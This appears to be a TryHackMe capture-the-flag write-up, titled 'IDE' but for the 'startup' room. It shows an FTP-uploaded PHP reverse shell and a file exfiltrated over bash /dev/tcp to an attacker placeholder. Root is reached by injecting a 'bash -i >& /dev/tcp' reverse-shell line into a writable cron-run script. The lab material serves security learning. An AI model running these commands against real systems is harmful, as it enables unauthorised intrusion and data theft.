# TryHackMe - IDE

[Room link](https://tryhackme.com/room/startup)

---

## Enumeration

Nmap :

```bash
[...]
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:B5:E9:5D:9D:5F (Unknown)
```

---

### FTP 
---

Let(s try to connect us to the ftp servica as anonymous user.

```bash
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
-rw-r--r--    1 0        0               5 Nov 12  2020 .test.log
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt

That works. 

```bash
ftp> get .test.log
ftp> get important.jpg
ftp> get notice.txt
```

After reading this files, there is no important things in there. Let's moving on the web service on the 80 port.

---

### HTTP 80

There is not interresting things on the default page. We will scan the web content directory of this website with dirb tool.

```bash
$ dirb http://10.10.1.159/
[...]
==> DIRECTORY: http://10.10.1.159/files/
+ http://10.10.1.159/index.html (CODE:200|SIZE:808)                          
+ http://10.10.1.159/server-status (CODE:403|SIZE:276) 
```

The files in the files directory seems the same on the ftp. 

---

## Exploitation

Let's try to upload a reverse shell on the ftp service.

```bash
ftp> put php-reverse-shell.php 
local: php-reverse-shell.php remote: php-reverse-shell.php
200 PORT command successful. Consider using PASV.
553 Could not create file.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
-rw-r--r--    1 0        0               5 Nov 12  2020 .test.log
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp> cd ftp
250 Directory successfully changed.
ftp> put php-reverse-shell.php 
local: php-reverse-shell.php remote: php-reverse-shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5494 bytes sent in 0.00 secs (124.7497 MB/s)
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Jan 03 17:56 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
-rwxrwxr-x    1 112      118          5494 Jan 03 17:56 php-reverse-shell.php
226 Directory send OK.

```

We can't upload a file on the root of the ftp but we can on the "ftp" directory. Don't forget to set up the nc listenner and activate this file on the http://<target_ip>/files/

```bash
Connection from 10.10.1.159 44792 received!
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 17:58:59 up 19 min,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$
```

We received a connection !

---

### Secret food flag

```bash
$ cat recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was ****.
```

## User flag

After stabilized our shell, let's look on the root server directory. There is a strange directory named "incidents" with a pcap file named "

```bash
www-data@startup:/$ ls -l
total 92
drwxr-xr-x   2 root     root      4096 Sep 25  2020 bin
drwxr-xr-x   3 root     root      4096 Sep 25  2020 boot
drwxr-xr-x  16 root     root      3560 Jan  3 17:39 dev
drwxr-xr-x  96 root     root      4096 Nov 12  2020 etc
drwxr-xr-x   3 root     root      4096 Nov 12  2020 home
drwxr-xr-x   2 www-data www-data  4096 Nov 12  2020 incidents
[...]
www-data@startup:/incidents$ ls -l
total 32
-rwxr-xr-x 1 www-data www-data 31224 Nov 12  2020 suspicious.pcapng
```

We need to download this file for analyzes it with wireshark. Let's download it via nc listenner.

On the attacker machine :

```bash
$ nc -lnvp 1235 > file.pcap
```

On the target machine :

```bash
$ bash -c 'cat suspicious.pcapng > /dev/tcp/<attacker_ip>/1235'
```

Let's dive into the sequence 7 of the TCP stream on the pcap file and show the TCP stream, we can see a strange string.

Let's try to connect on the user lennie with this password.

That works !

```bash
www-data@startup:/incidents$ su lennie -
Password: 
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
lennie@startup:/incidents$
```

The user flag is in the lennie's home directory on the user.txt file.

---

## Root flag

On the lennie's home directory, we can see a script called planner.sh

```bash
lennie@startup:~/scripts$ cat planner.sh 
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

After reading, the script will execute /etc/print.sh script and this file is editable by lennie.
The next step is to set up a nc will initilized a connection. 

On the attacker machine :

```bash
nc -lnvp 1235
```

On the target machine, add this lines into /etc/print.sh :

```bash
bash -c 'exec bash -i &>/dev/tcp/<attack_ip>/1235 <&1'
```

Right now, we are root !

Then, get the root flag on /root/root.txt
